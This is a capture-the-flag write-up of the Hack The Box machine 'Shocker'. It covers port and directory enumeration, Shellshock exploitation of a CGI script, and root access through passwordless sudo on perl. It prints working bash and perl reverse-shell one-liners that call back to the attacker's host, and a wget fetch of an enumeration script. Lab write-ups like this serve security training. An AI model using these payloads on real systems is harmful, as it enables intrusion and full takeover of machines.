# Shocker

First, make `shocker.htb` resolve to `10.10.10.56` in your `/etc/hosts` file.

### Enumeration

We start this off with a full port scan of `shocker.htb`.

```bash
$ nmap -sVC -p- -vvv -oN enumeration/allports shocker.htb
# Nmap 7.80 scan initiated Sat Apr 25 06:02:44 2020 as: nmap -sVC -p- -vvv -oN enumeration/allports shocker.htb
Nmap scan report for shocker.htb (10.10.10.56)
Host is up, received conn-refused (0.048s latency).
Scanned at 2020-04-25 06:02:45 CDT for 41s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 25 06:03:26 2020 -- 1 IP address (1 host up) scanned in 41.92 seconds
```

Ports `80` and `2222` are open, with `ssh` running on a weird port.

Website enumeration time.

```bash

$ gobuster dir -u http://shocker.htb/ -w ~/tools/wordlists/common.txt --wildcard -t 40 -o enumeration/gobuster-root
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shocker.htb/
[+] Threads:        40
[+] Wordlist:       /home/alichtman/tools/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 06:13:49 Starting gobuster
===============================================================
/cgi-bin/ (Status: 403)
===============================================================
2020/04/25 06:13:52 Finished
===============================================================

$ gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://shocker.htb/cgi-bin/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/small.txt
[+] Status codes:   200,204,301,302,307,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,sh,cgi,pl
[+] Timeout:        10s
===============================================================
2020/04/25 06:19:35 Starting gobuster
===============================================================
/user.sh (Status: 200)
===============================================================
2020/04/25 06:19:41 Finished
===============================================================
```

Let's check out `http://shocker.htb/cgi-bin/user.sh`.

```
Content-Type: text/plain

Just an uptime test script

07:27:15 up 22 min,  0 users,  load average: 0.03, 0.04, 0.02
```

Whenever you see `CGI` scripts, you should check for `shellshock` vulnerabilities.

### Reverse Shell

```bash
$ git clone git@github.com:nccgroup/shocker.git && cd shocker
$ ./shocker.py -H shocker.htb --cgi /cgi-bin/user.sh

   .-. .            .
  (   )|            |
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |
   `-' '  `-`-'  `-''  `-`--''  v1.1

 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker

 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)


[+] Single target '/cgi-bin/user.sh' being used
[+] Checking connectivity with target...
[+] Target was reachable
[+] Looking for vulnerabilities on shocker.htb:80
[+] 1 potential target found, attempting exploits
[+] The following URLs appear to be exploitable:
  [1] http://shocker.htb:80/cgi-bin/user.sh
[+] Would you like to exploit further?
[>] Enter an URL number or 0 to exit: 1
[+] Entering interactive mode for http://shocker.htb:80/cgi-bin/user.sh
[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'
# I start a nc listener in my own shell
   > /bin/bash -i >&/dev/tcp/10.10.14.5/1234 0>&1
```

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 56156
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
cd /home/shelly
shelly@Shocker:/home/shelly$ wc user.txt
wc user.txt
 1  1 33 user.txt
```

And that's our user proof.

### Root Privilege Escalation

I spin up a server on my local machine with `$ python3 -m http.server 80` and `$ wget 10.10.14.5/LinEnum.sh` from the remote machine, make it executable with `$ chmod +x LinEnum.sh`, and run it with `$ ./LinEnum.sh -t`. In the output, I spot this:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

[+] Possible sudo pwnage!
/usr/bin/perl
```

I grab my favorite `perl` reverse shell: `$ perl -e 'use Socket;$i="10.10.14.5";$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, throw `sudo` before it and run it on the remote machine after opening a `nc` listener on my host.

```
$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.56] 34722
# whoami
root
# wc -l /root/root.txt
1 /root/root.txt
```

And there is our root shell.
